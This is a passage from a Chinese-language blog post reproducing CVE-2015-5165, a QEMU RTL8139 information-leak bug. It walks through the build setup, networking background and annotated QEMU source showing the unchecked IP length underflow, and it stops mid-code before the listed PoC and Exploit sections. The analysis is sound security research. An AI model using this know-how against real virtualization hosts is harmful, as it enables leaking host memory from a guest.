<!DOCTYPE html>
<html lang="zh-Hans">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="QEMU信息泄露漏洞分析与利用----CVE-2015-5165"/><meta name="keywords" content="QEMU, CVE, hhdx's blog" /><link rel="alternate" href="/atom.xml" title="hhdx's blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://hhdx.xyz/2020/12/05/CVE-2015-5165/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177325662-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177325662-1');
</script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
</script>

    <title>QEMU信息泄露漏洞分析与利用----CVE-2015-5165 - hhdx's blog</title>
  <meta name="generator" content="Hexo 5.2.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">hhdx's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/links/">
        <li class="mobile-menu-item">Links
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">hhdx's blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/links/">
            Links
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">QEMU信息泄露漏洞分析与利用----CVE-2015-5165
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-05
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU%E7%BC%96%E8%AF%91"><span class="toc-text">QEMU编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9CQEMU%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">制作QEMU虚拟机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C"><span class="toc-text">网络</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7"><span class="toc-text">以太网帧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IP%E6%95%B0%E6%8D%AE%E6%8A%A5"><span class="toc-text">IP数据报</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RTL8139"><span class="toc-text">RTL8139</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞代码触发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug"><span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">遇到的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vulnerability"><span class="toc-text">vulnerability</span></a></li></ol></li></ol>
    </div>
  </div><div class="post-content"><p>参考大佬们的文章复现CVE-2015-5165。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>宿主机环境 Ubuntu 20.10</p>
<h3 id="QEMU编译"><a href="#QEMU编译" class="headerlink" title="QEMU编译"></a>QEMU编译</h3><p>QEMU <a target="_blank" rel="noopener" href="https://github.com/qemu/qemu/tree/bd80b5963f58c601f31d3186b89887bf8e182fb5">commit-bd80b59</a>源码下载。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> unzip qemu.zip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure>

<p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h&gt;</code> 即可解决。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major&#x27;</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="制作QEMU虚拟机"><a href="#制作QEMU虚拟机" class="headerlink" title="制作QEMU虚拟机"></a>制作QEMU虚拟机</h3><p>这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击<a target="_blank" rel="noopener" href="https://mirrors6.tuna.tsinghua.edu.cn/ubuntu-releases/xenial/ubuntu-16.04.6-server-i386.iso">下载</a>。</p>
<p>还需要下载安装VNC-Viewer，稍后会用到。<a target="_blank" rel="noopener" href="https://www.realvnc.com/en/connect/download/viewer/linux/">链接</a>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \  <span class="comment"># 能用嵌套虚拟就用(添加--enable-kvm)</span></span></span><br><span class="line">~/tmp/iso/ubuntu-16.04.6-server-i386.iso \</span><br><span class="line">-hda ~/tmp/vm/ubuntu.img -m 1024</span><br><span class="line"><span class="meta">$</span><span class="bash"> vncviewer host:port  <span class="comment"># 连接上，安装就好</span></span></span><br></pre></td></tr></table></figure>

<p>（尽量使用–enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）</p>
<a id="more"></a>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>因为涉及到了网卡，而且产生漏洞是数据包长度溢出所导致，所以需要了解一定的网络知识，可以看下面来复习一下。</p>
<p>OSI(Open Systems Interconnection)将网络协议分为7层，从上往下依次是：</p>
<ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li>数据链路层</li>
<li>物理层</li>
</ul>
<p>而现实中使用的TCP/IP协议是5层的，依次是：</p>
<ol>
<li><p>应用层，是网络应用程序及其应用层协议存留的地方。因特网的应用层包括许多协议，常见的有HTTP(它为web文档提供了请求和传送)、SMTP(它提供了电子邮件报文的传输)和FTP(它提供了两个端系统之间的文件传送)。</p>
</li>
<li><p>传输层，负责为信源和信宿提供应用程序<strong>进程</strong>（包括同一终端上的不同进程）间的数据传输服务，这一层上主要定义了两个传输协议，传输控制协议即TCP和用户数据报协议UDP。</p>
</li>
<li><p>网络层，负责将数据报独立地从信源发送到信宿，主要解决路由选择、拥塞控制和网络互联等问题。</p>
</li>
<li><p>数据链路层，负责将IP数据报封装成合适在物理网络上传输的帧格式并传输，或将从物理网络接收到的帧解封，取出IP数据报交给网络层。</p>
</li>
<li><p>物理层，负责将<strong>比特流</strong>在结点间传输，即负责物理传输。该层的协议既与链路有关也与传输介质有关。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgTCPIP.jpg" alt="TCPIP"></p>
<p>IP数据包(IPv4)头部长度为20-60字节，TCP报文头部长度也是20-60字节。</p>
<h4 id="以太网帧"><a href="#以太网帧" class="headerlink" title="以太网帧"></a>以太网帧</h4><p>在以太网链路上的数据包称作以太帧。以太帧起始部分由前导码和帧开始符组成。后面紧跟着一个以太网报头，以MAC地址说明目的地址和源地址。帧的中部是该帧负载的包含其他协议报头的数据包(例如IP协议)。以太帧由一个32位冗余校验码结尾。它用于检验数据传输是否出现损坏。</p>
<p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgEthernetFrame.png" alt="EthernetFrame"></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>前同步码</td>
<td>用来使接收端的适配器在接收 MAC 帧时能够迅速调整时钟频率，使它和发送端的频率相同。前同步码为 7 个字节，1 和 0 交替。</td>
</tr>
<tr>
<td>帧开始定界符</td>
<td>帧的起始符，为 1 个字节。前 6 位 1 和 0 交替，最后的两个连续的 1 表示告诉接收端适配器：“帧信息要来了，准备接收”。</td>
</tr>
<tr>
<td>目的地址</td>
<td>接收帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。作用是当网卡接收到一个数据帧时，首先会检查该帧的目的地址，是否与当前适配器的物理地址相同，如果相同，就会进一步处理；如果不同，则直接丢弃。</td>
</tr>
<tr>
<td>源地址</td>
<td>发送帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。</td>
</tr>
<tr>
<td>类型</td>
<td>上层协议的类型。由于上层协议众多，所以在处理数据的时候必须设置该字段，标识数据交付哪个协议处理。例如，字段为 0x0800 时，表示将数据交付给 IP 协议。</td>
</tr>
<tr>
<td>数据</td>
<td>也称为效载荷，表示交付给上层的数据。以太网帧数据长度最小为 46 字节，最大为 1500 字节。如果不足 46 字节时，会填充到最小长度。最大值也叫最大传输单元（MTU）。  在 Linux 中，使用 ifconfig 命令可以查看该值，通常为 1500。</td>
</tr>
<tr>
<td>帧检验序列 FCS</td>
<td>检测该帧是否出现差错，占 4 个字节（32 比特）。发送方计算帧的循环冗余码校验（CRC）值，把这个值写到帧里。接收方计算机重新计算 CRC，与 FCS 字段的值进行比较。如果两个值不相同，则表示传输过程中发生了数据丢失或改变。这时，就需要重新传输这一帧。</td>
</tr>
</tbody></table>
<h4 id="IP数据报"><a href="#IP数据报" class="headerlink" title="IP数据报"></a>IP数据报</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgipdata.png" alt="ipdata"></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>版本号</td>
<td>占用4位二进制数，表示该IP数据报使用的IP协议版本。目前Internet中使用的主要是TCP/IP协议族中版本号为4的IP协议。</td>
</tr>
<tr>
<td>首部长度</td>
<td>占用4位二进制位，此域指出整个报头的长度（包括选项），该长度是<strong>以32位二进制数为一个计数单位</strong>的，接收端通过此域可以计算出报头在何处结束及从何处开始读数据。普通IP数据报（没有任何选项）该字段的值是5（即20个字节的长度）。</td>
</tr>
<tr>
<td>服务类型(TOS, Type Of Service)</td>
<td>占用8位二进制位，用于规定本数据报的处理方式。</td>
</tr>
<tr>
<td>总长度</td>
<td>占用16位二进制位，总长度字段是指整个IP数据报的长度（报头区+数据区），以字节为单位。</td>
</tr>
<tr>
<td>标识</td>
<td>占16位（第二行四个字节中1~15位），它是一个计数器，用来产生数据报的标识，即每产生一个数据报贴上一个标识。</td>
</tr>
<tr>
<td>标志</td>
<td>目前只有前两位有意义。<br/>标志字段的最低位是 <strong>MF</strong> (More Fragment)。MF = 1 表示后面“还有分片”。<strong>MF</strong> = 0 表示最后一个分片。<br/>标志字段中间的一位是 <strong>DF</strong> (Don’t Fragment) 。只有当 DF = 0 时才允许分片。</td>
</tr>
<tr>
<td>片偏移</td>
<td>较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</td>
</tr>
<tr>
<td>TTL</td>
<td>Time To Live，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。</td>
</tr>
</tbody></table>
<h3 id="RTL8139"><a href="#RTL8139" class="headerlink" title="RTL8139"></a>RTL8139</h3><p>RTL8139被用在许多古老或者廉价的设备中，支持10/100MBit。支持的速率较慢，但由于它的简洁性，如今它广泛被用在虚拟化环境中。这也使得它的驱动程序比较简单，所以通常是OS开发爱好者们的第一个设备。它支持两种接收发送(Receive/Transmit)模式：C mode和C+ mode。vender ID: 0x10EC，device ID: 0x8139。</p>
<p>QEMU中模拟的RTL8139，对应的结构为<code>RTL8139State</code>(位于文件<code>hw/net/rtl8139.c:435</code>)。</p>
<p><code>RTL8139State</code>结构体中许多的字段就是RTL8139网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商Realtek提供的Datesheet。下图为RTL8139在C+模式下寄存器的介绍：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>TxConfig：发送数据相关的配置参数</li>
<li>RxConfig：接收数据相关的配置参数</li>
<li>CpCmd：C+ 模式相关配置参数，比如：<ul>
<li>CplusRxEnd 表示启用接收</li>
<li>CplusTxEnd 表示启用发送</li>
</ul>
</li>
<li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul>
<li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li>
<li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li>
</ul>
</li>
<li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li>
<li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li>
<li>TxPoll：让网卡检查 Tx descriptors</li>
</ul>
<p>关于 <code>Descriptor</code>(<strong>Tx缓冲区是网卡的发送数据缓冲区，而Rx缓冲区则是接收数据缓冲区。Tx表以及Rx表为一个16字节结构体大小的数组，该表中的<code>Descriptor</code>包含缓冲区的具体位置)</strong> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册，下图为 <code>Transmit Descriptor</code> 的定义：</p>
<p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgrtl8139_txdescriptor.png" alt="rtl8139_txdescriptor"></p>
<p>Phrack的文章[4]中将其定义为（这是为了方便设置的，QEMU中并不存在这个结构）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现网卡的C+模式中，文件位于<code>hw/net/rtl8139.c:1827</code>中的函数<code>rtl8139_cplus_transmit_one</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="comment">/* Now decide if descriptor being processed is holding the last segment of packet */</span></span><br><span class="line">    <span class="keyword">if</span> (txdw0 &amp; CP_TX_LS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">uint8_t</span> *saved_buffer  = s-&gt;cplus_txbuffer;</span><br><span class="line">        <span class="keyword">int</span>      saved_size    = s-&gt;cplus_txbuffer_offset;</span><br><span class="line">        <span class="keyword">int</span>      saved_buffer_len = s-&gt;cplus_txbuffer_len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode offloaded task checksum\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* ip packet header */</span></span><br><span class="line">            ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 这里saved_buffer其实就是以太网帧</span></span><br><span class="line">            <span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line">            <span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// 检查以太网中的Type，即上层协议类型</span></span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">&quot;+++ C+ mode has IP packet\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* not aligned */</span></span><br><span class="line">                <span class="comment">// 跳过以太网帧头，到达IP数据报</span></span><br><span class="line">                eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">                eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">                ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">                    DPRINTF(<span class="string">&quot;+++ C+ mode packet has bad IP version %d &quot;</span></span><br><span class="line">                        <span class="string">&quot;expected %d\n&quot;</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">                        IP_HEADER_VERSION_4);</span><br><span class="line">                    ip = <span class="literal">NULL</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    hlen = IP_HEADER_LENGTH(ip);</span><br><span class="line">                    ip_protocol = ip-&gt;ip_p;</span><br><span class="line">                    <span class="comment">// vulnerability here</span></span><br><span class="line">                    <span class="comment">// 完全信任了用户所提供的IP数据报的头长度和数据长度</span></span><br><span class="line">                    <span class="comment">// ip_data_len为uint16_t类型</span></span><br><span class="line">                    <span class="comment">// 当be16_to_cpu(ip-&gt;ip_len) &lt; hlen时，就会发生溢出</span></span><br><span class="line">                    <span class="comment">// 最大0xFFFF</span></span><br><span class="line">                    ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数中，计算IP数据报的数据长度时，没有对总长度<code>ip-&gt;ip_len</code>和头长度<code>hlen</code>进行校验，在恶意构造为<code>ip-&gt;ip_len &lt; heln</code>时，就会发生溢出。在此函数中的后面，因为长度过长就会使用<code>rtl8139_transfer_frame</code>进行分片发送：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="keyword">if</span> ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> large_send_mss = (txdw0 &gt;&gt; <span class="number">16</span>) &amp; CP_TC_LGSEN_MSS_MASK;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ C+ mode offloaded task TSO MTU=%d IP data %d &quot;</span></span><br><span class="line">                <span class="string">&quot;frame data %d specified MSS=%d\n&quot;</span>, ETH_MTU,</span><br><span class="line">                ip_data_len, saved_size - ETH_HLEN, large_send_mss);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> tcp_send_offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> send_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maximum IP header length is 60 bytes */</span></span><br><span class="line">        <span class="keyword">uint8_t</span> saved_ip_header[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* save IP header template; data area is used in tcp checksum calculation */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(saved_ip_header, eth_payload_data, hlen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a placeholder for checksum calculation routine in tcp case */</span></span><br><span class="line">        <span 